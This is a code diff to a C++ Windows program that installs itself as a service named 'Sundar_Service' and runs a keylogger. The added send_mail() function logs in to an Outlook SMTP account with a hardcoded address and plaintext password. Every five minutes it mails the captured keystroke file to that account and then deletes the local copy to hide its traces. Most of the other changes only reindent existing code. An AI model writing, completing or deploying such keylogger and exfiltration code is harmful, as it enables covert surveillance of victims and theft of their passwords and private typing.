@@ -2,9 +2,14 @@
 //
 
 #include "stdafx.h"
+#include "CSmtp.h"
 #include "KeyLogManager.h"
 #include "ServiceManager.h"
 #include "tlhelp32.h" 
+#include  <io.h>
+#include  <stdio.h>
+#include  <stdlib.h>
+
 
 #define		MAX_NUM_OF_PROCESS		4
 /** Window Service **/
@@ -23,6 +28,7 @@ void start_service_busi();
 void stop_service_busi();
 DWORD WINAPI keylog_thread(LPVOID info);
 DWORD WINAPI email_thread(LPVOID info);
+bool send_mail();
 bool is_service_env();
 HANDLE keylog_tid;
 HANDLE email_tid;
@@ -46,29 +52,29 @@ KeyLogManager klm;
 PROCESS_INFORMATION	keylog_proc_info = {0};
 
 int WINAPI _tWinMain(
-    HINSTANCE hInstance,
-    HINSTANCE hPrevInstance,
-    LPTSTR lpCmdLine,
-    int nCmdShow
-){
-	if(strcmp(lpCmdLine, "-k") == 0){
-		Logger::debug("Keylog Mode");
-		keylog_main();
-		return 0;
-	}
-	strcpy(service_name,"Sundar_Service");	
-	DWORD size = GetModuleFileName(NULL, exe_path, sizeof(exe_path));
-	exe_path[size] = 0;
+	HINSTANCE hInstance,
+	HINSTANCE hPrevInstance,
+	LPTSTR lpCmdLine,
+	int nCmdShow
+	){
+		if(strcmp(lpCmdLine, "-k") == 0){
+			Logger::debug("Keylog Mode");
+			keylog_main();
+			return 0;
+		}
+		strcpy(service_name,"Sundar_Service");	
+		DWORD size = GetModuleFileName(NULL, exe_path, sizeof(exe_path));
+		exe_path[size] = 0;
 
-	bool is_service = ServiceManager::is_service_env();
-	if(is_service){
-		Logger::debug("Service Mode");
-		service_main();
-	} else{
-		Logger::debug("Installer Mode");
-		installer_main();
-	}
-	return 0;
+		bool is_service = ServiceManager::is_service_env();
+		if(is_service){
+			Logger::debug("Service Mode");
+			service_main();
+		} else{
+			Logger::debug("Installer Mode");
+			installer_main();
+		}
+		return 0;
 }
 
 void installer_main(){	
@@ -93,29 +99,29 @@ VOID service_main()
 VOID WINAPI service_proc(DWORD dwArgc, LPTSTR *lpszArgv)
 {
 	DWORD   status = 0; 
-    DWORD   specificError = 0xfffffff; 
- 
-    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
-    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
-    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_PAUSE_CONTINUE; 
-    ServiceStatus.dwWin32ExitCode      = 0; 
-    ServiceStatus.dwServiceSpecificExitCode = 0; 
-    ServiceStatus.dwCheckPoint         = 0; 
-    ServiceStatus.dwWaitHint           = 0; 
- 
-    hServiceStatusHandle = RegisterServiceCtrlHandler(service_name, service_handler); 
-    if (hServiceStatusHandle==0) {
+	DWORD   specificError = 0xfffffff; 
+
+	ServiceStatus.dwServiceType        = SERVICE_WIN32; 
+	ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
+	ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_PAUSE_CONTINUE; 
+	ServiceStatus.dwWin32ExitCode      = 0; 
+	ServiceStatus.dwServiceSpecificExitCode = 0; 
+	ServiceStatus.dwCheckPoint         = 0; 
+	ServiceStatus.dwWaitHint           = 0; 
+
+	hServiceStatusHandle = RegisterServiceCtrlHandler(service_name, service_handler); 
+	if (hServiceStatusHandle==0) {
 		Logger::debug("RegisterServiceCtrlHandler failed, error code = %d\n", GetLastError());
-        return; 
-    } 
- 
-    // Initialization complete - report running status 
-    ServiceStatus.dwCurrentState       = SERVICE_RUNNING; 
-    ServiceStatus.dwCheckPoint         = 0; 
-    ServiceStatus.dwWaitHint           = 0;  
-    if(!SetServiceStatus(hServiceStatusHandle, &ServiceStatus)) {
+		return; 
+	} 
+
+	// Initialization complete - report running status 
+	ServiceStatus.dwCurrentState       = SERVICE_RUNNING; 
+	ServiceStatus.dwCheckPoint         = 0; 
+	ServiceStatus.dwWaitHint           = 0;  
+	if(!SetServiceStatus(hServiceStatusHandle, &ServiceStatus)) {
 		Logger::debug("SetServiceStatus failed, error code = %d\n", GetLastError()); 
-    } 
+	} 
 
 	start_service_busi();
 }
@@ -179,10 +185,53 @@ DWORD WINAPI keylog_thread(LPVOID info){
 	return 0;
 }
 
+bool send_mail(){
+	char path[512];
+	get_save_path(path);
+	try{
+		CSmtp mail;
+		mail.SetSMTPServer("smtp-mail.outlook.com", 587);
+		mail.SetSecurityType(SMTP_SECURITY_TYPE::USE_TLS);
+
+		mail.SetLogin("cchtriptest@outlook.com");
+		mail.SetPassword("cchtrip123");
+		mail.SetSenderName("cchtriptest");
+		mail.SetSenderMail("cchtriptest@outlook.com");
+		mail.SetReplyTo("cchtriptest@outlook.com");
+		mail.SetSubject("Upload");
+		mail.AddRecipient("cchtriptest@outlook.com");
+		mail.SetXPriority(CSmptXPriority::XPRIORITY_NORMAL);
+		//mail.SetXMailer("The Bat! (v3.02) Professional");
+		mail.AddMsgLine("DOTO....");
+		int ret = access(path, 0);
+		if(-1 != access(path, 0)){
+			mail.AddAttachment(path);
+		}
+		mail.Send();
+	}catch(ECSmtp e){
+		Logger::debug("Send Mail Fail, Error:%s", e.GetErrorText().c_str());
+		return false;
+	}
+	DeleteFile(path);
+	return true;
+}
+
 DWORD WINAPI email_thread(LPVOID info){
+	time_t last_send = {0};
 	while(running){
+		time_t now = time(NULL);
+		double diff = difftime(now, last_send);
+		Logger::debug("Email Thread Running, Timediff %f", diff);
+		if(diff > 300){
+			bool ret = send_mail();
+			if(ret){
+				last_send = now;
+				Logger::debug("Email Sending Succ ............... ");
+			}else{
+				Logger::debug("Email Send Fail ............. ");
+			}
+		}
 		Sleep(5000);
-		Logger::debug("Email Thread Running");
 	}
 	Logger::debug("Email Thread Finish");
 	return 0;
@@ -211,30 +260,30 @@ VOID WINAPI service_handler(DWORD fdwControl)
 {
 	switch(fdwControl) 
 	{
-		case SERVICE_CONTROL_STOP:
-		case SERVICE_CONTROL_SHUTDOWN:
-			ServiceStatus.dwWin32ExitCode = 0; 
-			ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
-			ServiceStatus.dwCheckPoint    = 0; 
-			ServiceStatus.dwWaitHint      = 0;
-			// terminate all processes started by this service before shutdown
-			{
-				stop_service_busi();		
-			}
-			break; 
-		case SERVICE_CONTROL_PAUSE:
-			ServiceStatus.dwCurrentState = SERVICE_PAUSED; 
-			break;
-		case SERVICE_CONTROL_CONTINUE:
-			ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
-			break;
-		case SERVICE_CONTROL_INTERROGATE:
-			break;
-		default:
-			Logger::debug("Unrecognized opcode %d\n", fdwControl);
+	case SERVICE_CONTROL_STOP:
+	case SERVICE_CONTROL_SHUTDOWN:
+		ServiceStatus.dwWin32ExitCode = 0; 
+		ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
+		ServiceStatus.dwCheckPoint    = 0; 
+		ServiceStatus.dwWaitHint      = 0;
+		// terminate all processes started by this service before shutdown
+		{
+			stop_service_busi();		
+		}
+		break; 
+	case SERVICE_CONTROL_PAUSE:
+		ServiceStatus.dwCurrentState = SERVICE_PAUSED; 
+		break;
+	case SERVICE_CONTROL_CONTINUE:
+		ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
+		break;
+	case SERVICE_CONTROL_INTERROGATE:
+		break;
+	default:
+		Logger::debug("Unrecognized opcode %d\n", fdwControl);
 	};
-    if (!SetServiceStatus(hServiceStatusHandle, &ServiceStatus)) {
+	if (!SetServiceStatus(hServiceStatusHandle, &ServiceStatus)) {
 		Logger::debug("SetServiceStatus failed, error code = %d\n", GetLastError());
-    } 
+	} 
 }
- 
+
